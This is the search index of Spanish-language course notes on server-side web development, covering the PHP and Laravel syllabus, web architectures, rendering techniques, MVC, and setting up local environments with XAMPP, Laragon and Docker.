{"config":{"lang":["es"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"index.html","title":"Desarrollo Web en Entorno Servidor","text":"Apuntes en construcci\u00f3n <p>Estos apuntes se est\u00e1n actualizando por Eladio Blanco durante el curso 25/26 tomando como base los elaborados en el curso 21/22 por Aitor Medrano y Luis Alema\u00f1.</p> <p>Aqu\u00ed puedes encontrar los apuntes del m\u00f3dulo de Desarrollo web en entorno servidor, que se imparte en el segundo curso del ciclo formativo de grado superior de Desarrollo de Aplicaciones Web.</p> <p>La duraci\u00f3n del m\u00f3dulo es de 168 horas lectivas, a raz\u00f3n de 7 horas semanales, y se desarrolla a lo largo de los dos primeros trimestres del curso. Se ha planificado bas\u00e1ndose en 4 sesiones por semana.</p>"},{"location":"index.html#que-voy-a-aprender","title":"\u00bfQu\u00e9 voy a aprender?","text":"<ul> <li>A desarrollar aplicaciones web din\u00e1micas, que obtienen la informaci\u00f3n a partir de una base de datos.</li> <li>Analizar la estructura de una aplicaci\u00f3n cliente/servidor, separando el c\u00f3digo de presentaci\u00f3n de la l\u00f3gica de negocio.</li> <li>Obtener informaci\u00f3n a partir de los datos almacenados, as\u00ed como modificarlos.</li> <li>Utilizar frameworks de desarrollo web para agilizar el proceso de desarrollo.</li> <li>Crear servicios web para la comunicaci\u00f3n entre aplicaciones.</li> </ul>"},{"location":"index.html#resultados-de-aprendizaje","title":"Resultados de aprendizaje","text":"<ol> <li>Selecciona las arquitecturas y tecnolog\u00edas de programaci\u00f3n web en entorno servidor, analizando sus capacidades y caracter\u00edsticas propias.</li> <li>Escribe sentencias ejecutables por un servidor web reconociendo y aplicando procedimientos de integraci\u00f3n del co\u0301digo en lenguajes de marcas.</li> <li>Escribe bloques de sentencias embebidos en lenguajes de marcas, seleccionando y utilizando las estructuras de programaci\u00f3n.</li> <li>Desarrolla aplicaciones web embebidas en lenguajes de marcas analizando e incorporando funcionalidades seg\u00fan especificaciones.</li> <li>Desarrolla aplicaciones web identificando y aplicando mecanismos para separar el co\u0301digo de presentaci\u00f3n de la l\u00f3gica de negocio.</li> <li>Desarrolla aplicaciones web de acceso a almacenes de datos, aplicando medidas para mantener la seguridad y la integridad de la informaci\u00f3n.</li> <li>Desarrolla servicios web reutilizables y accesibles mediante protocolos web, verificando su funcionamiento.</li> <li>Genera p\u00e1ginas web dina\u0301micas analizando y utilizando tecnolog\u00edas y frameworks del servidor web que a\u00f1adan co\u0301digo al lenguaje de marcas.</li> <li>Desarrolla aplicaciones web hi\u0301bridas seleccionando y utilizando tecnolog\u00edas, frameworks servidor y repositorios heterog\u00e9neos de informaci\u00f3n.</li> </ol>"},{"location":"index.html#unidades-didacticas-y-temporalizacion","title":"Unidades did\u00e1cticas y temporalizaci\u00f3n","text":"<p>A continuaci\u00f3n se muestran las unidades did\u00e1cticas y una estimaci\u00f3n temporal de cada una de ellas. La primera evaluaci\u00f3n contendr\u00eda las unidades comprendidas entre la 1 y 5, y parte de la unidad 6. As\u00ed pues, desde la mitad de la  unidad 6 a la unidad 9 se ver\u00e1n en la segunda evaluaci\u00f3n.</p>"},{"location":"index.html#primera-evaluacion","title":"Primera evaluaci\u00f3n","text":"<p>Duraci\u00f3n estimada: 76 horas</p> <ol> <li>Arquitecturas Web (4h)<ul> <li>Cliente/Servidor.</li> <li>MVC.</li> <li>Puesta en marcha con XAMPP y Docker.</li> </ul> </li> <li>El lenguaje PHP (26h)<ul> <li>Condiciones y bucles.</li> <li>Arrays.</li> </ul> </li> <li>Orientaci\u00f3n a objetos con PHP (18h)<ul> <li>Clases y objetos</li> <li>Namespaces</li> <li>Excepciones</li> </ul> </li> <li>Programaci\u00f3n Web (12h)<ul> <li>Formularios.</li> <li>Cookies.</li> <li>Sesiones.</li> </ul> </li> <li>Herramientas Web (16h)<ul> <li>Gesti\u00f3n de librer\u00edas con Composer.</li> <li>Env\u00edo de correos con Resend.</li> <li>Gesti\u00f3n de logs con Monolog.</li> <li>Documentaci\u00f3n con phpDocumentor.</li> <li>Web scraping con Goutte.</li> <li>Pruebas con PhpUnit.</li> </ul> </li> <li>Acceso a datos (28h)<ul> <li>SQL</li> <li>PDO</li> <li>Ficheros CSV y PDF.</li> </ul> </li> </ol>"},{"location":"index.html#segunda-evaluacion","title":"Segunda evaluaci\u00f3n","text":"<p>Duraci\u00f3n estimada: 86 horas</p> <ol> <li>Frameworks PHP - Laravel (28h)<ul> <li>Instalaci\u00f3n y entornos de desarrollo</li> <li>Rutas</li> <li>Vistas y plantillas Blade</li> <li>Controladores</li> </ul> </li> <li>Gestion de datos en Laravel (24h)<ul> <li>Migraciones e integraci\u00f3n con el ORM Eloquent.</li> <li>Query Builder</li> <li>Modelos</li> <li>Formulario sy validaci\u00f3n</li> </ul> </li> <li>Uso avanzado de Laravel (22h)<ul> <li>Almacenamiento de ficheros (local y AWS S3)</li> <li>Request y responses</li> <li>Relaciones entre modelos</li> <li>Seeders y factor\u00edas</li> <li>Mutadores y accesores</li> </ul> </li> <li>Autenticaci\u00f3n y autorizaci\u00f3n (12h)<ul> <li>Autenticaci\u00f3n</li> <li>Autorizaci\u00f3n</li> <li>Kits de inicio</li> <li>Laravel Cloud</li> </ul> </li> <li>Servicios REST (12h)<ul> <li>Producci\u00f3n y consumo.</li> <li>AJAX con JSON.</li> </ul> </li> </ol>"},{"location":"index.html#evaluacion","title":"Evaluaci\u00f3n","text":"<p>La nota de cada evaluaci\u00f3n y tambi\u00e9n final se calcula mediante una suma ponderada de la nota de cada Criterio de Evaluaci\u00f3n evaluado hasta el momento.</p> <p>A cada criterio se le asigna un porcentaje del total de la nota final y va asociado a un tipo de actividad que puede ser:</p> <ul> <li>Examen Teor\u00eda</li> <li>Examen Pr\u00e1cticas</li> <li>Ejercicios de clase</li> <li>Pr\u00e1cticas obligatorias</li> </ul>"},{"location":"index.html#recursos","title":"Recursos","text":"<p>Recursos del m\u00f3dulo</p> Documentaci\u00f3nSoftwareCursos PHPCursos Laravel <ul> <li> <p>Tutoriales</p> <ul> <li>Programaci\u00f3n web en PHP - mclibre.org</li> <li>Tutorial para principiantes</li> </ul> </li> <li> <p>Referencias</p> <ul> <li>Documentaci\u00f3n oficial de PHP</li> <li>Documentaci\u00f3n oficial de Laravel</li> <li>LaravelDocs - Documentaci\u00f3n no oficial de Laravel en espa\u00f1ol</li> </ul> </li> <li> <p>Recopilatorio</p> <ul> <li>Awesome PHP</li> </ul> </li> </ul> <ul> <li>IDEs<ul> <li>Visual Studio Code</li> <li>PHPStorm</li> </ul> </li> <li>Administraci\u00f3n de bases de datos<ul> <li>DBeaver</li> </ul> </li> <li> <p>Entorno de desarrollo</p> <ul> <li>Laragon</li> <li>XAMPP</li> </ul> </li> <li> <p>Entorno de desarrollo en contenedores</p> <ul> <li>Docker: Devilbox</li> <li>Docker: Laradock</li> </ul> </li> </ul> <ul> <li>OpenWebinars:<ul> <li>PHP: fundamentos</li> <li>PHP: Ampliando conceptos</li> <li>PHP y MySQL: Creando sitios din\u00e1micos</li> </ul> </li> </ul> <ul> <li>Laracasts (oficiales):<ul> <li>30 d\u00edas para aprender Laravel (ingl\u00e9s)</li> </ul> </li> <li>El rinc\u00f3n de Isma (Youtube):<ul> <li>Curso completo de Laravel 11</li> </ul> </li> <li>OpenWebinars:<ul> <li>Desarrollo Web Moderno con Laravel: De la teor\u00eda a la pr\u00e1ctica</li> </ul> </li> </ul>"},{"location":"01arquitecturas.html","title":"Arquitecturas Web","text":"Duraci\u00f3n y criterios de evaluaci\u00f3n <p>Duraci\u00f3n estimada: 3 sesiones</p> <p>Resultado de aprendizaje:</p> <ol> <li>Selecciona las arquitecturas y tecnolog\u00edas de programaci\u00f3n Web en entorno servidor, analizando sus capacidades y caracter\u00edsticas propias.</li> </ol> <p>Criterios de evaluaci\u00f3n:</p> <ol> <li>Se han caracterizado y diferenciado los modelos de ejecuci\u00f3n de c\u00f3digo en el servidor y en el cliente Web.</li> <li>Se han reconocido las ventajas que proporciona la generaci\u00f3n din\u00e1mica de p\u00e1ginas Web y sus diferencias con la inclusi\u00f3n de sentencias de guiones en el interior de las p\u00e1ginas Web.</li> <li>Se han identificado los mecanismos de ejecuci\u00f3n de c\u00f3digo en los servidores Web.</li> <li>Se han reconocido las funcionalidades que aportan los servidores de aplicaciones y su integraci\u00f3n con los servidores Web.</li> <li>Se han identificado y caracterizado los principales lenguajes y tecnolog\u00edas relacionados con la programaci\u00f3n Web en entorno servidor.</li> <li>Se han verificado los mecanismos de integraci\u00f3n de los lenguajes de marcas con los lenguajes de programaci\u00f3n en entorno servidor.</li> <li>Se han reconocido y evaluado las herramientas de programaci\u00f3n en entorno servidor.</li> </ol> <p>Las arquitecturas web definen la forma en que las p\u00e1ginas de un sitio web est\u00e1n estructuradas y enlazadas entre s\u00ed. Las aplicaciones web se basan en en modelo cliente-servidor.</p>"},{"location":"01arquitecturas.html#11-modelo-clienteservidor","title":"1.1 Modelo Cliente/Servidor","text":"Arquitectura Cliente Servidor <p>Uno o varios cliente acceden a un servidor. La nuevas arquitecturas sustituyen el servidor por un balanceador de carga de manera que N servidores dan respuesta a M clientes.</p> <p>En las aplicaciones web, el cliente es el navegador web.</p> <p>El cliente hace la petici\u00f3n (request normalmente mediante el protocolo GET mediante el puerto 80/443) y el servidor responde (response).</p>"},{"location":"01arquitecturas.html#pagina-web-dinamica","title":"P\u00e1gina web din\u00e1mica","text":"<p>Si la p\u00e1gina web \u00fanicamente contiene HTML + CSS se considera una p\u00e1gina est\u00e1tica. Para generar una p\u00e1gina din\u00e1mica, donde el contenido cambia, a d\u00eda de hoy tenemos dos alternativas:</p> <ul> <li>Utilizar un lenguaje de servidor que genere el contenido, ya sea mediante el acceso a una BD o servicios externos.</li> <li>Utilizar servicios REST de terceros invocados desde JS.</li> </ul> P\u00e1gina web din\u00e1mica <p>Las tecnolog\u00edas empleadadas (y los perfiles de desarrollo asociados) para la generaci\u00f3n de p\u00e1ginas din\u00e1micas son:</p> Perfil Herramienta Tecnolog\u00eda Front-end / cliente Navegador Web HTML + CSS + JavaScript Back-end / servidor Servidor Web + BBDD PHP, Python, Ruby, Java / JSP, .Net / .asp <p>Perfil Full-stack</p> <p>En las ofertas de trabajo cuando hacen referencia a un Full-stack developer, est\u00e1n buscando un perfil que domina tanto el front-end como el back-end.</p>"},{"location":"01arquitecturas.html#single-page-application","title":"Single Page Application","text":"<p>A d\u00eda de hoy, gran parte del desarrollo web est\u00e1 transicionando de una arquitectura web cliente-servidor cl\u00e1sica donde el cliente realiza una llamada al backend, por una arquitectura SPA donde el cliente gana mucho mayor peso y sigue una programaci\u00f3n reactiva que accede a servicios remotos REST que realizan las operaciones (comunicandose mediante JSON).</p> Arquitectura tradicional vs SPA M\u00e1s info sobre las SPA <p>Para profundizar en las aplicaciones SPA, puedes consultar los siguientes recursos:</p> <ul> <li>Aplicaciones SPA vs Aplicaciones MPA</li> <li>SPA Wikipedia</li> <li>\u00bfQu\u00e9 es una SPA en programaci\u00f3n?</li> </ul>"},{"location":"01arquitecturas.html#tecnicas-de-renderizado","title":"T\u00e9cnicas de renderizado","text":""},{"location":"01arquitecturas.html#que-es-el-renderizado","title":"\u00bfQu\u00e9 es el renderizado?","text":"<p>Es el proceso de transformar c\u00f3digo (HTML, CSS, JavaScript) en una p\u00e1gina web visual que podemos ver en nuestro navegador.</p>"},{"location":"01arquitecturas.html#tipos-de-renderizado-de-sitios-web","title":"Tipos de renderizado de sitios web:","text":"<p>Existen diferentes t\u00e9cnicas o enfoques de renderizado, cada uno con sus ventajas y desventajas, dependiendo de las necesidades de la aplicaci\u00f3n. Los principales tipos de renderizado son:</p> Client-Side Rendering (CSR) <p>\u00bfC\u00f3mo funciona?</p> <p>El navegador descarga el HTML b\u00e1sico y el JavaScript necesario. Luego, el c\u00f3digo JavaScript se ejecuta en el navegador del usuario para crear la interfaz de usuario completa.</p> <p>Ventajas:</p> <ul> <li>Experiencia de usuario din\u00e1mica: Permite crear interfaces altamente interactivas y aplicaciones de una sola p\u00e1gina (SPA) con transiciones suaves.</li> <li>Flexibilidad: F\u00e1cil de desarrollar y actualizar.</li> </ul> <p>Desventajas:</p> <ul> <li>Rendimiento inicial: La primera carga puede ser lenta, ya que el navegador tiene que descargar todo el JavaScript y renderizar la p\u00e1gina.</li> <li>SEO: Los motores de b\u00fasqueda pueden tener dificultades para indexar el contenido, ya que la p\u00e1gina no est\u00e1 completamente renderizada en el servidor.</li> </ul> Server-Side Rendering (SSR) <p>\u00bfC\u00f3mo funciona?</p> <p>El servidor genera el HTML completo de la p\u00e1gina y lo env\u00eda al navegador. El navegador solo tiene que renderizar el HTML, lo que es mucho m\u00e1s r\u00e1pido.</p> <p>Ventajas:</p> <ul> <li>Rendimiento inicial: La p\u00e1gina se carga mucho m\u00e1s r\u00e1pido, mejorando la experiencia del usuario.</li> <li>SEO: Los motores de b\u00fasqueda pueden indexar el contenido f\u00e1cilmente, ya que la p\u00e1gina est\u00e1 completamente renderizada en el servidor.</li> </ul> <p>Desventajas:</p> <ul> <li>Escalabilidad: Puede ser m\u00e1s costoso en t\u00e9rminos de recursos del servidor, especialmente para sitios con mucho tr\u00e1fico.</li> <li>Complejidad: Requiere una configuraci\u00f3n m\u00e1s compleja en el servidor.</li> </ul> Static Site Generation (SSG) <p>\u00bfC\u00f3mo funciona?</p> <p>Las p\u00e1ginas se generan como archivos HTML est\u00e1ticos en tiempo de construcci\u00f3n y se sirven directamente desde el servidor.</p> <p>Ventajas:</p> <ul> <li>Rendimiento extremo: Las p\u00e1ginas se cargan instant\u00e1neamente, ya que no hay necesidad de renderizar nada en el servidor o en el cliente.</li> <li>SEO: Excelente para SEO, ya que las p\u00e1ginas son completamente est\u00e1ticas.</li> </ul> <p>Desventajas:</p> <ul> <li>Menos din\u00e1mico: No es ideal para sitios que requieren contenido generado din\u00e1micamente.</li> </ul> Incremental Static Regeneration (ISR) <p>\u00bfC\u00f3mo funciona?</p> <p>Combina lo mejor de SSG y SSR. Genera p\u00e1ginas est\u00e1ticas en tiempo de construcci\u00f3n, pero puede actualizar partes de ellas din\u00e1micamente en el servidor.</p> <p>Ventajas:</p> <ul> <li>Excelente equilibrio: Ofrece un buen rendimiento y flexibilidad.</li> <li>SEO: Bueno para SEO, ya que la mayor\u00eda del contenido es est\u00e1tico.</li> </ul> <p>Desventajas:</p> <ul> <li>Complejidad: Requiere una configuraci\u00f3n m\u00e1s compleja.</li> </ul>"},{"location":"01arquitecturas.html#cuando-usar-cada-uno","title":"\u00bfCu\u00e1ndo usar cada uno?","text":"<ul> <li>CSR: Ideal para aplicaciones de una sola p\u00e1gina (SPA) con mucha interactividad y actualizaciones frecuentes.</li> <li>SSR: Perfecto para sitios que priorizan el SEO y el rendimiento inicial, como tiendas en l\u00ednea o blogs.</li> <li>SSG: Ideal para sitios est\u00e1ticos o con contenido que cambia con poca frecuencia, como portafolios o sitios de documentaci\u00f3n.</li> <li>ISR: Perfecto para sitios que necesitan una combinaci\u00f3n de contenido est\u00e1tico y din\u00e1mico, como blogs con comentarios o noticias.</li> </ul> <p>En resumen:</p> <p>La elecci\u00f3n del tipo de renderizado depender\u00e1 de las necesidades espec\u00edficas de tu proyecto. Considera factores como el rendimiento, el SEO, la complejidad y la frecuencia de actualizaci\u00f3n del contenido.</p> M\u00e1s info sobre los tipos de renderizado <p>Para profundizar en los tipos de renderizado de sitios web, puedes consultar los siguientes recursos:</p> <ul> <li>Next.js: Tipos de Renderizado (CSR, SSR, SSG, ISR)</li> <li>Client Side Rendering vs Server Side Rendering (v\u00eddeo)</li> <li>CSR vs SSR (tablero)</li> <li>Hacer r\u00e1pida tu web - Tipos de renderizado (v\u00eddeo)</li> </ul>"},{"location":"01arquitecturas.html#12-arquitectura-de-3-capas","title":"1.2 Arquitectura de 3 capas","text":"<p>Hay que distinguir entre capas f\u00edsicas (tier) y capas l\u00f3gicas (layer).</p>"},{"location":"01arquitecturas.html#tier","title":"Tier","text":"<p>Capa f\u00edsica de una arquitectura. Supone un nuevo elemento hardware separado f\u00edsicamente. Las capas f\u00edsicas m\u00e1s alejadas del cliente est\u00e1n m\u00e1s protegidas, tanto por firewalls como por VPN.</p> <p>Ejemplo de arquitectura en tres capas f\u00edsicas (3 tier):</p> <ul> <li>Servidor Web</li> <li>Servidor de Aplicaciones</li> <li>Servidor de base de datos</li> </ul> Arquitectura de tres capas f\u00edsicas <p>Cluster en tiers</p> <p>No confundir las capas con la cantidad de servidores. Actualmente se trabaja con arquitecturas con m\u00faltiples servidores en una misma capa f\u00edsica mediante un cluster, para ofrecer tolerancia a errores y escalabilidad horizontal.</p>"},{"location":"01arquitecturas.html#layer","title":"Layer","text":"<p>En cambio, las capas l\u00f3gicas (layers) organizan el c\u00f3digo respecto a su funcionalidad:</p> <ul> <li>Presentaci\u00f3n</li> <li>Negocio / Aplicaci\u00f3n / Proceso</li> <li>Datos / Persistencia</li> </ul> <p>Como se observa, cada una de las capas se puede implementar con diferentes lenguajes de programaci\u00f3n y/o herramientas.</p> Arquitectura de tres capas f\u00edsicas en tres l\u00f3gicas"},{"location":"01arquitecturas.html#13-mvc","title":"1.3 MVC","text":"<p>Model-View-Controller o Modelo-Vista-Controlador es un modelo de arquitectura que separa los datos y la l\u00f3gica de negocio respecto a la interfaz de usuario y el componente encargado de gestionar los eventos y las comunicaciones.</p> <p>Al separar los componentes en elementos conceptuales permite reutilizar el c\u00f3digo y mejorar su organizaci\u00f3n y mantenimiento. Sus elementos son:</p> <ul> <li>Modelo: representa la informaci\u00f3n y gestiona todos los accesos a \u00e9sta, tanto consultas como actualizaciones provenientes, normalmente, de una base de datos. Se accede via el controlador.</li> <li>Controlador: Responde a las acciones del usuario, y realiza peticiones al modelo para solicitar informaci\u00f3n. Tras recibir la respuesta del modelo, le env\u00eda los datos a la vista.</li> <li>Vista: Presenta al usuario de forma visual el modelo y los datos preparados por el controlador. El usuario interactura con la vista y realiza nuevas peticiones al controlador.</li> </ul> <p>Lo estudiaremos en m\u00e1s detalle al profundizar en el uso de los frameworks PHP.</p>"},{"location":"01arquitecturas.html#14-decisiones-de-diseno","title":"1.4 Decisiones de dise\u00f1o","text":"<ul> <li>\u00bfQu\u00e9 tama\u00f1o tiene el proyecto?</li> <li>\u00bfQu\u00e9 lenguajes de programaci\u00f3n conozco? \u00bfVale la pena el esfuerzo de aprender uno nuevo?</li> <li>\u00bfVoy a usar herramientas de c\u00f3digo abierto o herramientas propietarias? \u00bfCu\u00e1l es el coste de utilizar soluciones comerciales?</li> <li>\u00bfVoy a programar la aplicaci\u00f3n yo solo o formar\u00e9 parte de un grupo de programadores?</li> <li>\u00bfCuento con alg\u00fan servidor web o gestor de base de datos disponible o puedo decidir libremente utilizar el que crea necesario?</li> <li>\u00bfQu\u00e9 tipo de licencia voy a aplicar a la aplicaci\u00f3n que desarrolle?</li> </ul>"},{"location":"01arquitecturas.html#15-herramientas","title":"1.5 Herramientas","text":""},{"location":"01arquitecturas.html#servidor-web","title":"Servidor Web","text":"<p>Software que recibe peticiones HTTP (GET, POST, DELETE, ...) y devuelve el recurso solicitado (HTML, CSS, JS, JSON, im\u00e1genes, etc...) normalmente desde el navegador del usuario.</p> <p>El producto m\u00e1s implantando es Apache Web Server (https://httpd.apache.org/), creado en 1995.</p> <ul> <li>Software libre y multiplataforma</li> <li>Sistema de m\u00f3dulos din\u00e1micos \u2192 PHP, Python, Perl</li> <li>Utiliza el archivo <code>.htaccess</code> para su configuraci\u00f3n</li> </ul> <p>En la actualidad, Apache est\u00e1 perdiendo mercado respecto a Nginx (https://www.nginx.com). Se trata de un producto m\u00e1s moderno (2004) y que en determinados escenarios tiene mejor rendimiento que Apache.</p> <ul> <li>Comparativa servidores web: https://w3techs.com/technologies/history_overview/web_server/ms/q</li> </ul>"},{"location":"01arquitecturas.html#servidor-de-aplicaciones","title":"Servidor de Aplicaciones","text":"<ul> <li>Software que ofrece servicios adicionales a los de un servidor web:<ul> <li>Clustering</li> <li>Balanceo de carga</li> <li>Tolerancia a fallos</li> </ul> </li> <li>Tomcat (http://tomcat.apache.org/) es el servidor de aplicaciones open source y multiplataforma de referencia para una arquitectura Java.<ul> <li>Contiende un contenedor Web Java que interpreta Servlets y JSP.</li> </ul> </li> </ul> <p>Info</p> <p>Tanto los servidores web como los servidores de aplicaciones se estudian en profundidad en el m\u00f3dulo de \"Despliegue de Aplicaciones Web\".</p>"},{"location":"01arquitecturas.html#lenguajes-en-el-servidor","title":"Lenguajes en el servidor","text":"<p>Las aplicaciones que generan las p\u00e1ginas web se programan en alguno de los siguientes lenguajes:</p> <ul> <li>PHP</li> <li>JavaEE: Servlets / JSP</li> <li>Python</li> <li>ASP.NET \u2192 Visual Basic .NET / C#</li> <li>Ruby</li> <li>...</li> </ul>"},{"location":"01arquitecturas.html#javaee","title":"JavaEE","text":"<p>Java Enterprise Edition es la soluci\u00f3n Java para el desarrollo de aplicaciones enterprise. Ofrece una arquitectura muy completa y compleja, escalable y tolerante a fallos. Planteada para aplicaciones para grandes sistemas.</p> <p></p>"},{"location":"01arquitecturas.html#nodejs","title":"Node.js","text":"<ul> <li>Entorno de ejecuci\u00f3n de JavaScript en el servidor</li> <li>Basado en el motor V8 de Google</li> <li>Desarrollado por Ryan Dahl en 2009</li> <li>Utilizado por Netflix, Uber, LinkedIn, PayPal, ...</li> <li>Frameworks: Express, Koa, Hapi, Sails, Meteor, NestJS, ...</li> <li>Permite el desarrollo de aplicaciones web, de escritorio y m\u00f3viles</li> </ul>"},{"location":"01arquitecturas.html#php","title":"PHP","text":"<ul> <li>Lenguaje de prop\u00f3sito general dise\u00f1ado para el desarrollo de p\u00e1ginas web din\u00e1micas</li> <li>En un principio, lenguaje no tipado.</li> <li>Actualmente en la versi\u00f3n 8. Se recomienda al menos utilizar una versi\u00f3n superior a la 7.0.</li> <li>C\u00f3digo embebido en el HTML</li> <li>Instrucciones entre etiquetas <code>&lt;?php</code> y <code>?&gt;</code><ul> <li>Para generar codigo dentro de PHP, podemos usar la instrucci\u00f3n <code>echo</code></li> </ul> </li> <li>Multitud de librer\u00edas y frameworks:<ul> <li>Laravel, Symfony, Codeigniter, Zend</li> </ul> </li> </ul> <p>Su documentaci\u00f3n es bastante completa: https://www.php.net/manual/es/index.php</p> <p>El siguiente mapa mental muestra un resumen de sus elementos:</p> Elementos del lenguaje PHP <p>Durante las siguientes unidades vamos a estudiar PHP en profundidad.</p> <p>A jugar...</p> <p>Kahoot para repasar conceptos de redes e Internet: 40 preguntas sobre Internet</p>"},{"location":"01arquitecturas.html#16-puesta-en-marcha","title":"1.6 Puesta en marcha","text":"<p>Para poder trabajar con un entorno de desarrollo local, hemos de preparar nuestro entorno de desarrollo con las herramientas comentadas. A continuaci\u00f3n se exploran diferentes soluciones que incorporan un servidor web, PHP, el SGBD... como XAMPP, Laragon o contenedores Docker. Pru\u00e9balas y elige aquella con la que te sientas m\u00e1s c\u00f3modo, pero que tenga como m\u00ednimo la versi\u00f3n 8.2 de PHP.</p> Rutas y archivos <p>Independientemente de la soluci\u00f3n utilizada, hay que entender un par de conceptos importantes. Al final estamos utilizando un servidor web (Apache o Nginx) que sirve al navegador los archivos alojados en un determinado directorio de nuestro sistema, como por ejemplo:</p> <ul> <li><code>C:/xampp/xamppfiles/htdocs</code> \u2192 All\u00ed ser\u00e1 donde alojemos nuestras p\u00e1ginas web que visualizaremos desde la direcci\u00f3n <code>http://localhost/</code> en el navegador.</li> </ul> <p>Y como cualquier configuraci\u00f3n en sistemas, se realizar\u00e1 modificando directivas (variables) de determinados archivos, como por ejemplo:</p> <ul> <li><code>C:/xampp/xamppfiles/etc/httpd.conf</code> \u2192 Configuraci\u00f3n del servidor web.</li> <li><code>C:/xampp/xamppfiles/etc/php.ini</code> \u2192 Configuraci\u00f3n del lenguaje PHP.</li> </ul> Configuraci\u00f3n del php.ini <p>Si nuestra versi\u00f3n de PHP es la 8.5 o posterior, podemos consultar la configuraci\u00f3n que hemos cambiado en el <code>php.ini</code> con respecto a la original, lanzando en consola: <code>php -i diff</code></p>"},{"location":"01arquitecturas.html#xampp","title":"XAMPP","text":"<p>XAMPP (https://www.apachefriends.org/es/index.html) es una distribuci\u00f3n compuesta con el software necesario para desarrollar en entorno servidor. Se compone de las siguientes herramientas en base a sus siglas:</p> <ul> <li>X para el sistema operativo (de ah\u00ed que se conozca tamnbi\u00e9n como LAMP o WAMP).</li> <li>A para Apache.</li> <li>M para MySQL / MariaDB. Tambi\u00e9n incluye phpMyAdmin para la administraci\u00f3n de la base de datos desde un interfaz web.</li> <li>P para PHP.</li> <li>la \u00faltima P para Perl.</li> </ul> <p>Desde la propia p\u00e1gina se puede descargar el archivo ejecutable para el sistema operativo de nuestro ordenador. Se recomienda leer la FAQ de cada sistema operativo con instrucciones para su puesta en marcha.</p> <p>XAMPP en Windows</p> <p>Si vas a trabajar con tu propio ordenador, XAMPP es una soluci\u00f3n m\u00e1s sencilla que Docker, sobre todo si trabajar con Windows como sistema operativo.</p>"},{"location":"01arquitecturas.html#laragon","title":"Laragon","text":"<p>Laragon (https://laragon.org/) es una herramienta similar a XAMPP (solo para Windows) pero m\u00e1s moderna, con m\u00e1s opciones y un mantenimiento m\u00e1s activo que el de XAMPP.</p> <p>Si te animas a probarla, sigue estos pasos:</p> <ol> <li>Instalar Laragon</li> <li>Montar el entorno de desarrollo con Laragon</li> </ol>"},{"location":"01arquitecturas.html#docker","title":"Docker","text":"<p>Docker (https://www.docker.com) es un gestor de contenedores, considerando un contenedor como un m\u00e9todo de virtualizaci\u00f3n del sistema operativo.</p> <p>El uso de contenedores requiere menos recursos que una m\u00e1quina virtual, por lo tanto, su lanzamiento y detenci\u00f3n son m\u00e1s r\u00e1pidos que las m\u00e1quinas virtuales.</p> <p>As\u00ed pues, Docker permite crear, probar e implementar aplicaciones r\u00e1pidamente, a partir de una serie de plantillas que se conocen como im\u00e1genes de Docker.</p> <p>Para ello es necesario tener instalado Docker Desktop (https://www.docker.com/products/docker-desktop) en nuestros entornos de desarrollo (el cual ya incluye en nucleo de Docker y la herramienta docker compose). Para instalarlo en casa, en el caso de Windows, es necesario instalar previamente WSL 2, el cual es un subsistema de Linux dentro de Windows.</p> <p>A lo largo del curso iremos creando diferentes contenedores con los servicios necesarios, de manera que cada vez s\u00f3lo trabajemos con el software m\u00ednimo.</p> <p>Versiones</p> <p>A lo largo del curso vamos a usar PHP <code>8.3</code>. Respecto a Docker, para escribir los apuntes hemos utilizado la version <code>26.0.0</code> y la version <code>2.26.1</code> de docker compose. Finalmente, la versi\u00f3n de Docker Desktop que hemos utilizado es la <code>4.29.0</code>.</p>"},{"location":"01arquitecturas.html#plantilla-servidor-web-php","title":"Plantilla Servidor Web + PHP","text":"<p>Docker se basa en el uso de im\u00e1genes para crear contenedores. Docker Compose simplifica el trabajo con m\u00faltiples contenedores, y por ello, para facilitar el arraque, nos centraremos en Docker Compose utilizando una plantilla que \u00fanicamente va a contener como servicios Apache/Nginx y PHP.</p> <p>Para ello, vamos a rellenar el archivo <code>docker-compose.yaml</code> con:</p> Apache y PHPNginx y PHP <pre><code># Services\nservices:\n  # Apache + PHP\n  apache_php:\n    image: php:8-apache\n    # Preparamos un volumen para almacenar nuestro c\u00f3digo\n    volumes:\n      - ./src/:/var/www/html\n    expose:\n      - 80\n    ports:\n      - 80:80\n</code></pre> <pre><code># Services\nservices:\n\n  nginx:\n    image: nginx:1.19\n    ports:\n      - 80:80\n    volumes:\n      - ./src:/var/www/php\n      - ./.docker/nginx/conf.d:/etc/nginx/conf.d # cargamos la configuraci\u00f3n de un fichero externo\n    depends_on:\n      - php   # enlazamos nginx con php\n\n  php:\n    image: php:8.0-fpm\n    working_dir: /var/www/php\n    volumes:\n      - ./src:/var/www/php\n</code></pre> <p>Dentro de la carpeta que contenga dicho archivo, hemos de crear una carpeta <code>src</code> donde colocaremos nuestro c\u00f3digo fuente. Para facilitar la puesta en marcha, ten\u00e9is la plantilla de Apache/PHP (versi\u00f3n 2 con <code>a2enmod rewrite</code>) o Nginx/PHP disponible para su descarga.</p> <p>Cuando estemos listos, lanzaremos el servicio mediante:</p> <pre><code>docker compose up -d\n</code></pre> <p>Si queremos ver el contenido de los archivos de log del servicio utilizaremos:</p> <pre><code>docker compose logs -f\n</code></pre> <p>Para copiar un archivo desde nuestro sistema al interior del contenedor:</p> <pre><code>docker cp ./miFichero idContenedor:/tmp\n</code></pre> <p>Y al rev\u00e9s, si queremos consultar un archivo contenido dentro de un contenedor, lo copiaremos a nuestro sistema:</p> <pre><code>docker cp idContenedor:/tmp/archivoAConsultar.txt ./\n</code></pre> <p>Finalmente, si queremos acceder a un terminal interactivo dentro del contenedor:</p> <pre><code>docker exec -it nombreContenedor bash\n</code></pre> <p>Otros comandos que podemos llegar a utilizar son:</p> <ul> <li><code>docker ps</code>: Ver los contenedores que se estan ejecutando</li> <li><code>docker ps -a</code>: Ver todos los contenedores</li> <li><code>docker start nombreContenedor</code>: Arrancar un contenedor</li> <li><code>docker images</code>: Ver las im\u00e1genes que tenemos descargadas</li> </ul> <p>Otra forma m\u00e1s sencilla para lanzar de nuevo los contenedores y gestionarlos una vez creados es utilizar el interfaz gr\u00e1fico que ofrece Docker Desktop:</p> Arranque de contenedor mediante Docker Desktop <p>Docker stack</p> <p>Existen diversas opciones mediante Docker que ofrecen soluciones completas y empaquetas para todo el stack de desarrollo. En posteriores sesiones utilizaremos tanto Devilbox (http://devilbox.org) como Laradock (https://laradock.io)</p> <p>Pero quiero saber c\u00f3mo funciona...</p> <p>En el m\u00f3dulo de Despliegue de aplicaciones estudiar\u00e9is en profundidad, adem\u00e1s de Docker, Apache y otros servicios que nos servir\u00e1n de ayuda para el 